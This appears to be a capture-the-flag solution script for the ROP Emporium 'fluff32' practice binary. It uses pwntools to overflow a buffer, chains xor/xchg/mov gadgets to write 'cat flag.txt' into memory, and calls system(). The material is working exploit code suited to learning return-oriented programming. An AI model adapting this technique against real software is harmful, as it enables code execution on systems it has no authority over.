from pwn import *



def write_string_to_address(xor_edx_edx, xor_edx_ebx, pop_ebx, mov_ecx_edx, xchg_edx_ecx, string_address, instring):
	returndata = ""

	instring_split = [instring[i:i+4] for i in range(0, len(instring), 4 )]

	for i in range(len(instring_split)):
		# write address
		# pop address in to ebx
		returndata += p32(pop_ebx) # pop ebx; ret;
		returndata += p32(string_address + (i*4))

		# clear edx
		returndata += p32(xor_edx_edx) # xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret; 
		returndata += p32(0x0) # pop esi

		# xor edx ebx
		returndata += p32(xor_edx_ebx) # xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret;
		returndata += p32(0x0) # pop ebp

		# exchange edx in to ecx
		returndata += p32(xchg_edx_ecx) # xchg edx, ecx; pop ebp; mov edx, 0xdefaced0; ret;
		returndata += p32(0x0) # pop ebp

		# Write data
		# pop data in to ebx
		returndata += p32(pop_ebx) # pop ebx; ret;
		returndata += instring_split[i]

		# clear edx
		returndata += p32(xor_edx_edx) # xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret; 
		returndata += p32(0x0) # pop esi

		# xor edx ebx
		returndata += p32(xor_edx_ebx) # xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret;
		returndata += p32(0x0) # pop ebp

		# perform the mov
		returndata += p32(mov_ecx_edx) # mov dword ptr [ecx], edx; pop ebp; pop ebx; xor byte ptr [ecx], bl; ret;
		returndata += p32(0x0) # pop ebp
		returndata += p32(0x0) # pop ebx

	return returndata

def pad_string(instring):
	if instring[:-1] != '\x00':
		instring += '\x00'
	while len(instring) % 4 != 0:
		instring += '\x00'
	return instring



e = ELF("./fluff32")
p = process(e.path)
# p = gdb.debug(e.path,"b *0x80483e1\ncontinue\n")

junk = "A" * 44
plt_system = 0x8048430
section_data = 0x0804a028
command = "cat flag.txt"
command_pad = pad_string(command)

# Useful chains?
# 0x08048693: mov dword ptr [ecx], edx; pop ebp; pop ebx; xor byte ptr [ecx], bl; ret; 
# 0x08048671: xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret;
# 0x0804867b: xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret; 
# 0x08048689: xchg edx, ecx; pop ebp; mov edx, 0xdefaced0; ret;
# 0x080483e1: pop ebx; ret; 
# End useful chains

pop_ebx = 0x080483e1
xor_edx_edx = 0x08048671
xor_edx_ebx = 0x0804867b
mov_ecx_edx = 0x08048693
xchg_edx_ecx = 0x08048689


chain = junk
chain += write_string_to_address(xor_edx_edx, xor_edx_ebx, pop_ebx, mov_ecx_edx, xchg_edx_ecx, section_data, command_pad)
chain += p32(plt_system)
chain += 'junk'
chain += p32(section_data)

# with open("chain", "wb") as w:
# 	w.write(chain)

p.sendline(chain)
print(p.readall())